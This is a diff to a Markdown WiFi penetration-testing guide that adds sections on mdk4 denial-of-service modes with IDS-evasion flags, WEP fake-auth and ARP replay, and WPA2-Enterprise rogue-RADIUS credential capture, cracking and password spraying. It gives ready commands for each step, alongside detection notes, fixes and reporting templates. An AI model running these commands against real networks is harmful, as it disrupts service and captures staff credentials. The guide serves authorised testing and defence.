@@ -13,10 +13,10 @@ A hands-on WiFi hacking and penetration testing guide, written from my own lab n
 A wireless assessment runs in three phases, and every attack step has a matching defence step. That pairing is the whole point: you run the attack to prove the gap, then you tell the client how to detect and close it.
 
 1. **Prepare.** Get a **signed scope and rules-of-engagement**, then put a monitor-mode adapter on the air. No signature, no test.
-2. **Attack (in scope only).** Recon both bands, lock onto one in-scope target, capture the WPA/WPA2 handshake or PMKID, and crack it **offline**. Optional in-scope paths are WPS brute force, an evil twin to test client trust, and deauth/[mdk4](Documents/mdk4.md) which is a lab-only denial-of-service.
+2. **Attack (in scope only).** Recon both bands, lock onto one in-scope target, capture the WPA/WPA2 handshake or PMKID, and crack it **offline**. Optional in-scope paths are WPS brute force, an evil twin to test client trust, and deauth/[mdk4](#mdk4) which is a lab-only denial-of-service.
 3. **Defend and report.** Show how the blue team detects each attack (IDS, `tshark` on management frames), what hardening kills it (802.11w/PMF, WPA3, WPS off), and write it all up. The report is the deliverable, not the crack.
 
-The rest of this guide walks each box in order, starting at [monitor mode](#monitor-mode). Deep-dive companions: **[mdk4 attack modes and detection](Documents/mdk4.md)**, **[Fake-auth and ARP replay](Documents/fake-auth.md)**, and **[WPA2-Enterprise / 802.1X testing](Documents/wpa2-enterprise.md)**.
+The rest of this guide walks each box in order, starting at [monitor mode](#monitor-mode).
 
 ## Contents
 1. [Why WiFi testing matters](#why-wifi-testing-matters)
@@ -33,14 +33,15 @@ The rest of this guide walks each box in order, starting at [monitor mode](#moni
 12. [The evil twin](#the-evil-twin)
 13. [Automate it: wifite and airgeddon](#automate-it)
 14. [Deauth and denial of service](#deauth-and-denial-of-service)
-15. [How the blue team detects it](#how-the-blue-team-detects-it)
-16. [Hardening and defence](#hardening-and-defence)
-17. [Troubleshooting](#troubleshooting)
-18. [Choosing the right attack](#choosing-the-right-attack)
-19. [Where IoT fits in](#where-iot-fits-in)
-20. [Legal and ethics](#legal-and-ethics)
-
-**Companion deep-dives:** [mdk4 attack modes and detection](Documents/mdk4.md) · [Fake-auth and ARP replay](Documents/fake-auth.md) · [WPA2-Enterprise / 802.1X testing](Documents/wpa2-enterprise.md)
+15. [mdk4: beacon flood, auth DoS, and stress testing](#mdk4)
+16. [Fake authentication and ARP replay (WEP)](#fake-auth)
+17. [WPA2-Enterprise / 802.1X testing](#wpa2-enterprise)
+18. [How the blue team detects it](#how-the-blue-team-detects-it)
+19. [Hardening and defence](#hardening-and-defence)
+20. [Troubleshooting](#troubleshooting)
+21. [Choosing the right attack](#choosing-the-right-attack)
+22. [Where IoT fits in](#where-iot-fits-in)
+23. [Legal and ethics](#legal-and-ethics)
 
 ---
 
@@ -410,19 +411,173 @@ sudo aireplay-ng --deauth 0 -a 3C:84:6A:11:22:33 wlan0mon          # all clients
 sudo aireplay-ng --deauth 0 -a 3C:84:6A:11:22:33 -c 54:EF:44:AA:BB:CC wlan0mon   # one client
 ```
 
-Reference: the official [aireplay-ng documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) covers every mode (deauth, fakeauth, arpreplay, test).
+Reference: the official [aireplay-ng documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) covers every mode (deauth, fakeauth, arpreplay, test). For the broader stress-testing tool, see the dedicated [mdk4 section](#mdk4) next.
 
-**mdk4 (beacon flood, auth DoS, and more).** mdk4 is the broader 802.11 stress tool. A beacon flood (mode `b`) fills every scanner in range with fake APs, which is also the classic way to flood a Wireshark capture with noise; an auth DoS (mode `a`) can freeze an AP outright.
+## mdk4: beacon flood, auth DoS, and stress testing
+<a id="mdk4"></a>
+
+Where aireplay-ng does one thing (inject specific frames), **mdk4** is the all-round 802.11 stress tool. It is the successor to mdk3, ships in Kali, and exposes ten attack modes. It needs a card already in [monitor mode](#monitor-mode).
+
+> **Lab only.** Every command here disrupts a real network. Run them only against an AP you own or that is explicitly in scope, briefly, to generate a signature you then detect. See the [lab-only warning above](#deauth-and-denial-of-service) and the [legal section](#legal-and-ethics).
 
 ```bash
-sudo mdk4 wlan0mon b -n FakeNet          # beacon flood: fake APs (clutters scanners/Wireshark)
-sudo mdk4 wlan0mon a -a 3C:84:6A:11:22:33 # authentication DoS against one AP
-sudo mdk4 wlan0mon d -b blacklist.txt -c 6 # continuous deauth of listed BSSIDs
+mdk4 --fullhelp                           # list every mode and option
 ```
 
-Full breakdown of all ten mdk4 modes, the IDS-evasion flags, and the detection signature for each: **[Documents/mdk4.md](Documents/mdk4.md)**.
+### Demo: the three you will actually use
 
-What matters for a portfolio and for a defender is the other half: a deauth or beacon flood is loud and obvious, and a blue team should catch it instantly. That is the next section.
+```bash
+# 1. Beacon flood (mode b) - spam fake APs. Fills every scanner, and floods a
+#    Wireshark capture with junk beacons so real traffic is hard to read.
+sudo mdk4 wlan0mon b -n FakeCorp          # one fake SSID
+sudo mdk4 wlan0mon b -f ssids.txt         # a whole list of fake SSIDs from a file
+
+# 2. Authentication DoS (mode a) - flood an AP with fake auth frames.
+#    Enough fake clients can exhaust its table and freeze or reset it.
+sudo mdk4 wlan0mon a -a 3C:84:6A:11:22:33
+
+# 3. Deauth flood (mode d) - the continuous version of the handshake nudge,
+#    knocks listed BSSIDs offline and keeps them there.
+sudo mdk4 wlan0mon d -b blacklist.txt -c 6
+```
+
+### Why beacon flood "confuses Wireshark"
+
+A beacon flood makes a scanner show hundreds of APs that do not exist, and a live capture fills with thousands of beacon frames a second. To cut back to real traffic while studying a flood, filter beacons **out** in Wireshark:
+
+```
+wlan.fc.type_subtype == 0x08       # show only beacons (study the flood)
+!(wlan.fc.type_subtype == 0x08)    # hide beacons (keep reading real traffic)
+```
+
+### All ten modes, and what each one looks like to a defender
+
+| Mode | Attack | What a defender sees |
+| --- | --- | --- |
+| `b` | Beacon flooding | Dozens/hundreds of new SSIDs appear at once |
+| `a` | Authentication DoS | Flood of auth frames (subtype `0x0b`); AP may freeze/reset |
+| `p` | SSID probe / bruteforce | Burst of probe requests for one BSSID |
+| `d` | Deauth / disassociation | Deauth (12) / disassoc (10) storm, clients flapping |
+| `m` | Michael (TKIP) shutdown | TKIP AP shuts down ~60s (legacy networks only) |
+| `e` | EAPOL start/logoff flood | Flood of EAPOL-Start frames |
+| `s` | 802.11s mesh attacks | Abnormal mesh link-management traffic |
+| `w` | WIDS confusion | Contradictory association state across APs |
+| `f` | Packet fuzzer | Malformed / non-compliant frames |
+| `x` | Protocol-implementation PoC | Odd frames; target may crash or disconnect |
+
+A few notes that matter on a real test:
+
+- **`m` (Michael)** only bites legacy **TKIP** networks; modern WPA2-CCMP/WPA3 are immune, which is itself a finding ("you are still on TKIP").
+- **`w` (WIDS confusion)** deliberately feeds a wireless IDS contradictory data to see if it can be blinded, so it is useful specifically for exercising the blue team.
+- **`f` (fuzzer)** and **`x` (protocol PoC)** can crash drivers or firmware; report any device that crashes, that is a vendor bug.
+
+**IDS evasion.** mdk4 can append `--ghost <period,max_rate,min_txpower>` (switch rate/power periodically) and `--frag <min,max,percent>` (fragment outgoing frames) to dodge some signature-based IDS. They are driver-dependent and unreliable. The lesson for a defender: signature evasion is possible, so lean on **behavioural** detection (clients flapping, association-table churn, EAPOL rate) and on **802.11w / PMF**, which ignores the forged-management-frame modes (`a`, `d`, `e`) no matter how they are dressed up.
+
+What matters for a portfolio and for a defender is the other half: a deauth or beacon flood is loud and obvious, and a blue team should catch it instantly. That is covered in [how the blue team detects it](#how-the-blue-team-detects-it).
+
+## Fake authentication and ARP replay (WEP)
+<a id="fake-auth"></a>
+
+Fake authentication and ARP replay are classic **WEP** steps. WEP is obsolete and you will rarely meet it outside a lab or old hardware, but it is the cleanest way to understand injection, and `--fakeauth` is also how you associate with an AP that has no clients so you can inject. Official reference: [aireplay-ng documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng).
+
+Lock onto the target, then fake-authenticate so the AP accepts your injected frames:
+
+```bash
+sudo airodump-ng wlan0mon --bssid <router-mac> -c <channel> --write capture
+sudo aireplay-ng --fakeauth 0 -a <router-mac> -h <your-mac> wlan0mon
+```
+
+- `--fakeauth 0` single association (use e.g. `30` to re-associate every 30s if the AP drops you)
+- `-h` your card's MAC, which you can confirm with `macchanger -s wlan0mon` or `ip addr`
+
+A success prints `Association successful :-)`. Now replay an ARP packet to make the AP generate IVs fast, which is what cracks WEP:
+
+```bash
+sudo aireplay-ng --arpreplay -b <router-mac> -h <your-mac> wlan0mon
+aircrack-ng capture-01.cap          # with enough IVs, WEP falls in minutes
+```
+
+The lesson for any report: if WEP is running anywhere, replace it now. For WPA/WPA2 do not use this path; capture the handshake or PMKID and crack offline as [above](#capture-the-handshake).
+
+## WPA2-Enterprise / 802.1X testing
+<a id="wpa2-enterprise"></a>
+
+WPA2-Personal uses one shared passphrase. **WPA2-Enterprise** instead authenticates each user against a **RADIUS** server over **802.1X / EAP** (username/password with PEAP or EAP-TTLS, or a client certificate with EAP-TLS). There is no shared WiFi password to crack, so the test and the main weakness are different.
+
+**The flaw to test for:** whether clients **validate the RADIUS server certificate**. If a device will hand its credentials to any AP advertising the right SSID, an attacker stands up a fake AP plus a fake RADIUS server, and the client authenticates *to the attacker*, leaking its username and an MSCHAPv2 challenge/response that cracks offline. Nearly every real Enterprise finding traces back to this.
+
+> **Most sensitive step on the engagement.** Impersonation captures real staff credentials. Get it named explicitly in the rules-of-engagement, store captures encrypted, and destroy them after reporting.
+
+### Workflow, with the purpose and tool for each step
+
+1. **Confirm it is 802.1X and find the EAP method** (so you know if it is phishable). In airodump the `AUTH` column reads **MGT** for Enterprise.
+   ```bash
+   sudo airodump-ng wlan0mon --band abg       # confirm WPA2 MGT, note BSSID/channel
+   sudo crEAP -i wlan0mon                      # passively identify EAP types and usernames
+   sudo eapeak -f capture.pcap                 # parse a capture for EAP methods/identities
+   ```
+2. **Harvest usernames** (targeting, and to show which identities leak). `crEAP`/`eapeak` pull the outer identities, often sent in the clear.
+3. **Impersonate the RADIUS server** (the core test). A client that does not validate the cert connects and leaks its MSCHAPv2 challenge/response.
+   ```bash
+   sudo ./eaphammer --cert-wizard                                   # one-time: build the fake cert
+   sudo ./eaphammer -i wlan0 --channel 6 --auth wpa-eap \
+        --essid CorpWiFi --creds                                    # rogue AP + RADIUS, capture creds
+   sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf               # classic alternative
+   ```
+   **If no client connects, that is a PASS:** cert validation is enforced. Record it as such.
+4. **Crack the captured MSCHAPv2** offline (prove the password is recoverable).
+   ```bash
+   asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
+   hashcat -m 5500 captured.hash /usr/share/wordlists/rockyou.txt
+   ```
+5. **Password spray** within scope (test policy and lockout; keep attempts low so real staff are not locked out).
+   ```bash
+   sudo python3 air-hammer.py -i wlan0 -e CorpWiFi -u users.txt -p 'Winter2026!'
+   ```
+6. **EAP-TLS environments** (client certs): impersonation will not harvest passwords, so pivot to the certificate issuance/revocation process, whether private keys are exportable, device-vs-user cert scoping, and whether a stolen device grants access. This is an endpoint and process review.
+
+### Fixes to recommend
+- **Enforce server-certificate validation on every client** (validate CN/SAN, pin the internal CA). This one setting defeats the impersonation attack.
+- **Prefer EAP-TLS** (mutual certs) over PEAP/TTLS-MSCHAPv2 where feasible.
+- **Use a dedicated private CA** for RADIUS so clients can pin it, never a public one.
+- **Enforce lockout and a strong password policy** at the identity layer, plus [802.11w/PMF and segmentation](#hardening-and-defence).
+
+### Professional checklist
+
+```
+WPA2-ENTERPRISE / 802.1X TEST CHECKLIST
+[ ] Written authorisation and scope signed (SSID, realm, window, creds handling)
+[ ] Target confirmed as 802.1X (airodump AUTH = MGT)
+[ ] EAP method identified (PEAP / EAP-TTLS / EAP-TLS / EAP-FAST)
+[ ] Outer-identity usernames harvested (crEAP / eapeak)
+[ ] Rogue AP + fake RADIUS stood up (eaphammer / hostapd-wpe)
+[ ] Client cert-validation behaviour recorded (connected = FAIL, refused = PASS)
+[ ] MSCHAPv2 challenge/response captured (if any client connected)
+[ ] Offline crack attempted (asleap / hashcat -m 5500)
+[ ] Password spray tested within scope, lockout behaviour noted (air-hammer)
+[ ] EAP-TLS cert process reviewed (if applicable)
+[ ] IDS / RADIUS-log detection validated with the blue team
+[ ] All captured credentials stored encrypted and scheduled for destruction
+[ ] Findings, evidence, and remediation written up
+```
+
+### Reporting format
+
+One block per finding, factual and tied to a fix.
+
+```
+FINDING:   <short title, e.g. "Clients do not validate RADIUS server certificate">
+SEVERITY:  Critical / High / Medium / Low / Informational
+AFFECTED:  <SSID, client platforms, user groups observed>
+DESCRIPTION: <the weakness in plain language>
+EVIDENCE:  <redacted proof: username with password masked, rogue-AP log, timestamps>
+IMPACT:    <what an attacker gains, e.g. domain creds that also grant VPN + email>
+LIKELIHOOD: <how easy/likely, e.g. trivial: a laptop and a $30 adapter in the car park>
+REMEDIATION: <specific, e.g. GPO/MDM enforcing cert validation against CN radius.corp.local>
+STATUS:    Open
+```
+
+**Severity guidance:** Critical = creds captured and cracked, no cert validation. High = validation off but crack not finished in the window, or weak policy with no lockout. Medium = usernames leak, PEAP-MSCHAPv2 but validation enforced. Informational = EAP-TLS enforced correctly (document good posture too).
 
 ## How the blue team detects it
 <a id="how-the-blue-team-detects-it"></a>
